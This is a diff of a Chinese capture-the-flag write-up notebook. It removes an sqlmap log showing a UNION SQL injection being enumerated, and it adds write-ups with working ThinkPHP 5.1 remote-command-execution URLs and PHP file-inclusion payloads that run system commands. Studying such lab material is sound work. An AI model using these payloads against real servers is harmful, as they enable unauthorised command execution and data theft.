@@ -132,305 +132,72 @@ SQLMAP使用：
 * ```-C``` 指定字段（字段名要加双引号）
 * ```--dump``` 获取指定字段的值
 
-SQLMAP部分试验记录（不知道为甚麽最后dump报500(Internal Server Error)错误）：
-```
-ming@Neptune:~$ sqlmap -u http://111.198.29.45:37966/ --data "search=fuck"  #1.获取注入点
-        ___
-       __H__
- ___ ___[)]_____ ___ ___  {1.4.2#stable}
-|_ -| . [']     | .'| . |
-|___|_  [,]_|_|_|__,|  _|
-      |_|V...       |_|   http://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 10:49:51 /2020-02-24/
-
-[10:49:51] [INFO] testing connection to the target URL
-[10:49:52] [INFO] checking if the target is protected by some kind of WAF/IPS
-[10:49:52] [INFO] testing if the target URL content is stable
-[10:49:52] [INFO] target URL content is stable
-[10:49:52] [INFO] testing if POST parameter 'search' is dynamic
-[10:49:52] [WARNING] POST parameter 'search' does not appear to be dynamic
-[10:49:52] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
-[10:49:52] [INFO] testing for SQL injection on POST parameter 'search'
-[10:49:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[10:49:53] [WARNING] reflective value(s) found and filtering out
-[10:49:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
-[10:49:54] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
-[10:49:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
-[10:49:58] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
-[10:49:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
-[10:50:05] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
-[10:50:05] [INFO] testing 'MySQL inline queries'
-[10:50:05] [INFO] testing 'PostgreSQL inline queries'
-[10:50:05] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
-[10:50:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
-[10:50:05] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
-[10:50:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
-[10:50:30] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
-[10:50:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
-[10:50:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
-[10:50:37] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
-[10:50:38] [INFO] testing 'Oracle AND time-based blind'
-it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
-[10:51:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
-[10:52:26] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests
-[10:52:26] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
-[10:52:26] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
-[10:52:26] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-[10:52:28] [INFO] target URL appears to have 3 columns in query
-[10:52:28] [WARNING] applying generic concatenation (CONCAT)
-[10:52:28] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
-[10:52:28] [INFO] checking if the injection point on POST parameter 'search' is a false positive
-POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
-sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
 ---
-Parameter: search (POST)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
+
+
+# 4. php_rce
+
+**题目来源**：暂无  
+**题目描述**：暂无
+
+**WP**:
+> **原理**  
+> ThinkPHP5框架底层对控制器名过滤不严，可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞。
+> 
+> **目的**  
+> 掌握框架漏洞
+> 
+> **环境**  
+> Windows
+> 
+> **工具**  
+> firefox
+> 
+> **步骤**
+> 1. 根据主页提示，可以发现网页使用的是ThinkPHP框架，版本为5.1
+> 2. 此版本存在getshell漏洞（百度一下poc一抓一大把）
+> 3. 查找flag  
+> http://192.168.100.161:54064/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find%20/%20-name%20%22flag%22
+> 4. 查看flag  
+> http://192.168.100.161:54064/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag
+
+**总结**：奇怪的知识盲区增加了，看来php框架也得学一下；flag文件还有可能在根目录等，最好用find搜索一下
+
 ---
-[10:57:37] [INFO] testing MySQL
-[10:57:37] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
-[10:57:37] [INFO] confirming MySQL
-[10:57:37] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL >= 5.0.0
-[10:57:37] [WARNING] HTTP error codes detected during run:
-500 (Internal Server Error) - 37 times
-[10:57:37] [INFO] fetched data logged to text files under '/home/ming/.sqlmap/output/111.198.29.45'
 
-[*] ending @ 10:57:37 /2020-02-24/
+# 5. Web_php_include
 
-ming@Neptune:~$ cd .sqlmap/output/111.198.29.45/;ls
-log  session.sqlite  target.txt
-ming@Neptune:~/.sqlmap/output/111.198.29.45$ cat log
-sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
----
-Parameter: search (POST)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
----
-back-end DBMS: MySQL >= 5.0.0
-ming@Neptune:~/.sqlmap/output/111.198.29.45$ cat target.txt
-http://111.198.29.45:37966/ (POST)  # /usr/bin/sqlmap -u http://111.198.29.45:37966/ --data search=fuck
+**题目来源**：XTCTF  
+**题目描述**：暂无
 
-search=fuckming@Neptune:~/.sqlmap/output/111.198.29.45$ sqlite session.sqlite
-Unable to open database "session.sqlite": file is encrypted or is not a database
-ming@Neptune:~/.sqlmap/output/111.198.29.45$ cat session.sqlite
-SQLite format 3   @                                                                                                                                  SablestoragestorageCREATE TABLE storage (id INTEGER PRIMARY KEY, value TEXT   : 
-cat: write error: Input/output error
+**WP**:
+> **原理**  
+> php文件包含
+> 
+> **目的**  
+> 了解如何利用php文件包含
+> 
+> **环境**  
+> Windows
+> 
+> **工具**  
+> chrome
+> 
+> **步骤**
+> 1. 审计php代码,while函数根据page参数来判断php文件是否存在，如果存在此文件，则进行文件包含。
+> 2. 默认页面为http://127.0.0.1/index.php,设置为page值，可确保while为真
+> 3. 利用hello参数将执行内容显示  
+> ```
+> http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E
+> http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?show_source(%22fl4gisisish3r3.php%22);?%3E
+> ```
 
-ming@Neptune:~/.sqlmap/output/111.198.29.45$ sqlmap -u http://111.198.29.45:37966/ --data "search=fuck" -dbs  #2.获取数据库信息
-        ___
-       __H__
- ___ ___[,]_____ ___ ___  {1.4.2#stable}
-|_ -| . [.]     | .'| . |
-|___|_  [,]_|_|_|__,|  _|
-      |_|V...       |_|   http://sqlmap.org
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 11:05:52 /2020-02-24/
-
-[11:05:52] [INFO] resuming back-end DBMS 'mysql'
-[11:05:52] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: search (POST)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
----
-[11:05:52] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL 5
-[11:05:52] [INFO] fetching database names
-[11:05:53] [WARNING] reflective value(s) found and filtering out
-available databases [2]:
-[*] information_schema
-[*] news
-
-[11:05:53] [INFO] fetched data logged to text files under '/home/ming/.sqlmap/output/111.198.29.45'
-
-[*] ending @ 11:05:53 /2020-02-24/
-
-ming@Neptune:~/.sqlmap/output/111.198.29.45$ sqlmap -u http://111.198.29.45:37966/ --data "search=fuck" -D news --tables  #3.获取库内表信息
-        ___
-       __H__
- ___ ___[.]_____ ___ ___  {1.4.2#stable}
-|_ -| . [)]     | .'| . |
-|___|_  [)]_|_|_|__,|  _|
-      |_|V...       |_|   http://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 11:10:05 /2020-02-24/
-
-[11:10:05] [INFO] resuming back-end DBMS 'mysql'
-[11:10:05] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: search (POST)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
----
-[11:10:05] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL 5
-[11:10:05] [INFO] fetching tables for database: 'news'
-[11:10:05] [WARNING] reflective value(s) found and filtering out
-Database: news
-[2 tables]
-+--------------+
-| news         |
-| secret_table |
-+--------------+
-
-[11:10:05] [INFO] fetched data logged to text files under '/home/ming/.sqlmap/output/111.198.29.45'
-
-[*] ending @ 11:10:05 /2020-02-24/
-
-ming@Neptune:~/.sqlmap/output/111.198.29.45$ sqlmap -u http://111.198.29.45:37966/ --data "search=fuck" -D news -T secret_table --columns  #4.获取表内字段信息
-        ___
-       __H__
- ___ ___[,]_____ ___ ___  {1.4.2#stable}
-|_ -| . [)]     | .'| . |
-|___|_  [']_|_|_|__,|  _|
-      |_|V...       |_|   http://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 11:28:04 /2020-02-24/
-
-[11:28:04] [INFO] resuming back-end DBMS 'mysql'
-[11:28:04] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: search (POST)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
----
-[11:28:04] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL 5
-[11:28:04] [INFO] fetching columns for table 'secret_table' in database 'news'
-[11:28:04] [WARNING] reflective value(s) found and filtering out
-Database: news
-Table: secret_table
-[2 columns]
-+--------+------------------+
-| Column | Type             |
-+--------+------------------+
-| fl4g   | varchar(50)      |
-| id     | int(10) unsigned |
-+--------+------------------+
-
-[11:28:04] [INFO] fetched data logged to text files under '/home/ming/.sqlmap/output/111.198.29.45'
-
-[*] ending @ 11:28:04 /2020-02-24/
-
-ming@Neptune:~/.sqlmap/output/111.198.29.45$ sqlmap -u http://111.198.29.45:37966/ --data "search=fuck" -D news -T secret_table -C fl4g --dump  #5.获取字段内容，不知为何报500(Internal Server Error)错误
-        ___
-       __H__
- ___ ___[)]_____ ___ ___  {1.4.2#stable}
-|_ -| . [(]     | .'| . |
-|___|_  [)]_|_|_|__,|  _|
-      |_|V...       |_|   http://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 11:33:32 /2020-02-24/
-
-[11:33:32] [INFO] resuming back-end DBMS 'mysql'
-[11:33:32] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: search (POST)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
----
-[11:33:32] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL 5
-[11:33:32] [INFO] fetching entries of column(s) 'fl4g' for table 'secret_table' in database 'news'
-[11:33:33] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
-[11:33:33] [WARNING] reflective value(s) found and filtering out
-[11:33:33] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
-[11:33:33] [WARNING] unable to retrieve the entries of columns 'fl4g' for table 'secret_table' in database 'news'
-[11:33:33] [WARNING] HTTP error codes detected during run:
-500 (Internal Server Error) - 2 times
-[11:33:33] [INFO] fetched data logged to text files under '/home/ming/.sqlmap/output/111.198.29.45'
-
-[*] ending @ 11:33:33 /2020-02-24/
-ming@Neptune:~/.sqlmap/output/111.198.29.45$ ls
-dump  log  session.sqlite  target.txt
-ming@Neptune:~/.sqlmap/output/111.198.29.45$ cat log
-sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
----
-Parameter: search (POST)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
----
-back-end DBMS: MySQL >= 5.0.0
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: search (POST)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
----
-back-end DBMS: MySQL 5
-available databases [2]:
-[*] information_schema
-[*] news
-
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: search (POST)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
----
-back-end DBMS: MySQL 5
-Database: news
-[2 tables]
-+--------------+
-| news         |
-| secret_table |
-+--------------+
-
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: search (POST)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
----
-back-end DBMS: MySQL 5
-Database: news
-Table: secret_table
-[2 columns]
-+--------+------------------+
-| Column | Type             |
-+--------+------------------+
-| fl4g   | varchar(50)      |
-| id     | int(10) unsigned |
-+--------+------------------+
-
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: search (POST)
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
----
-back-end DBMS: MySQL 5
-ming@Neptune:~/.sqlmap/output/111.198.29.45$ ls
-dump  log  session.sqlite  target.txt
-ming@Neptune:~/.sqlmap/output/111.198.29.45$ ls dump/
-ming@Neptune:~/.sqlmap/output/111.198.29.45$
-```
+**总结**：
+1. 本题中先利用被echo的参数把要执行的PHP代码输出到当前页面上（记得带上```<?php ?>```或```<? ?>```），再用被include的参数来包含当前页面；
+2. ```strstr```（判断字符串中是否包含某子串）可用大小写绕过；
+3. ```file_get_contents```8行的时候可尝试```show_source```
+4. include的url要包含协议
+5. 可通过phpinfo查看system之类的敏感函数是否被禁用
 
 _//未完待xu_
